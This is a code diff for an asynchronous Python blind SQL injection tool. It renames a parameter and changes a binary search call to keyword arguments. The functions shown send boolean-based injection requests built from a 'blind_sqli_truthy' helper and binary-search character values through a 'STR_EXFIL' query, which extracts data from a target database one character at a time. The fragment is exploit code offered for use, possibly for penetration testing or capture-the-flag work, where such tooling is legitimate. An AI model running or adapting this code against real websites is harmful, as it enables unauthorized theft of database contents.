@@ -40,10 +40,10 @@ def response_truth_condition(response):
         return True
     return False
 async def blind_query(session:aiohttp.client.ClientSession,  response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool],
-                      ip:str, sub_query:str, ordinal:str = "",
+                      url:str, sub_query:str, ordinal:str = "",
                       query_encoder:Callable[[str], str]=None, debug:bool=False
                       ):
-    target = query_encoder(blind_sqli_truthy(ip,sub_query, COMMENT)) if query_encoder else blind_sqli_truthy(ip, sub_query, COMMENT)
+    target = query_encoder(blind_sqli_truthy(url,sub_query, COMMENT)) if query_encoder else blind_sqli_truthy(url, sub_query, COMMENT)
     try:
         async with session.get(target) as res:
             if debug == True:
@@ -101,7 +101,7 @@ async def get_count(url:str, sub_query: str, response_truth_condition:Callable[[
 async def binary_search(url:str, session:aiohttp.client.ClientSession, response_truth_condition:Callable[[aiohttp.client_reqrep.ClientResponse], bool], lo, hi, sub_query, position, query_encoder:Callable[[str], str]=None):
     while lo <= hi:
         mid = lo + (hi - lo) // 2
-        res = await blind_query(session, response_truth_condition, url, QUERIES['STR_EXFIL'](sub_query,position,mid), mid, query_encoder=query_encoder)
+        res = await blind_query(session=session,response_truth_condition=response_truth_condition, url=url, sub_query=QUERIES['STR_EXFIL'](sub_query,position,mid),ordinal=mid,query_encoder=query_encoder)
         if (res):
             lo = mid + 1
         else:
